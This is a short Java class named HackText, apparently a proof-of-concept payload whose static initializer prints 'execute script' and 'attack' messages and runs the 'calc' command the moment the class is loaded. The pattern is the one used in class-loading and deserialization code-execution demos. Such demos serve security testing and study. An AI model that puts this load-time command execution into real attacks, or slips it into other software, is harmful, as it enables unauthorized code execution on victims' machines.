package com.zyk;

import java.io.IOException;

public class HackText {
    static {
        System.out.println("执行脚本！");
        System.out.println("攻击！");
        try {
            String [] cmd={"calc"};
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
